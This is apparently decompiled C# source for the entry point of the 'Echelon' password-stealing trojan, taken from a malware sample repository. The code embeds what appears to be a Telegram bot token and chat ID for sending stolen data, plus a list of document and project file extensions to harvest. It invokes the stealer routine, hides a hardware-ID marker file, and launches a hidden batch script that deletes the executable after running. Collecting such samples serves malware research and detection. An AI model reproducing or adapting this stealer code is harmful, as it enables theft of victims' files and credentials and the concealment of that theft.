// Decompiled with JetBrains decompiler
// Type: Echelon.Program
// Assembly: Echelon, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DAEC4C03-F667-4BBB-B546-ED8351172E13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.MSIL.Coins.gen-d5a7c67747c1d8095b6fb6fef9f446b048a753bfda98e9cf19f265a6203e27cf.exe

using Echelon.Properties;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace Echelon
{
  internal class Program
  {
    public static string Token = "5291768091:AAHft5mCNqTTvGo7eBm_7oi7m28D7GBC_5c";
    public static string ID = "5237156109";
    public static string passwordzip = "Echelon";
    public static int FileSize = 10500000;
    public static string[] Echelon_Size = new string[13]
    {
      ".txt",
      ".rpd",
      ".suo",
      ".config",
      ".cs",
      ".csproj",
      ".tlp",
      ".sln",
      ".xls",
      ".xlsx",
      ".doc",
      ".docx",
      ".rar"
    };

    [STAThread]
    private static void Main()
    {
      AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(AppDomain_AssemblyResolve);
      if (File.Exists(Help.LocalData + "\\" + Help.HWID))
      {
        Stealer.GetStealer();
      }
      else
      {
        Stealer.GetStealer();
        File.AppendAllText(Help.LocalData + "\\" + Help.HWID, Help.HWID);
        File.SetAttributes(Help.LocalData + "\\" + Help.HWID, FileAttributes.Hidden | FileAttributes.System);
      }
      string path = Path.GetTempFileName() + ".bat";
      using (StreamWriter streamWriter = new StreamWriter(path))
      {
        streamWriter.WriteLine("@echo off");
        streamWriter.WriteLine("timeout 4 > NUL");
        streamWriter.WriteLine("DEL \"" + Path.GetFileName(new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name) + "\" /f /q");
      }
      Process.Start(new ProcessStartInfo()
      {
        FileName = path,
        CreateNoWindow = true,
        ErrorDialog = false,
        UseShellExecute = false,
        WindowStyle = ProcessWindowStyle.Hidden
      });
      Environment.Exit(0);

      static Assembly AppDomain_AssemblyResolve(object sender, ResolveEventArgs args) => args.Name.Contains("DotNetZip") ? Assembly.Load(Resources.DotNetZip) : (Assembly) null;
    }
  }
}
